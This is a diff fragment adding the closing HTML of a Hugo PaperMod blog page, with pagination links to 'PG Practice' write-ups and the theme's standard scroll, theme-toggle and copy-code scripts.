+      <li><a href="http://localhost:1313/tags/write-up/">Write-Up</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/writeups/pg_nickel/">
+    <span class="title">« Prev</span>
+    <span>PG Practice - Nickel</span>
+  </a>
+  <a class="next" href="http://localhost:1313/writeups/pg_kevin/">
+    <span class="title">Next »</span>
+    <span>PG Practice - Kevin</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">Fabio Birnegger</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
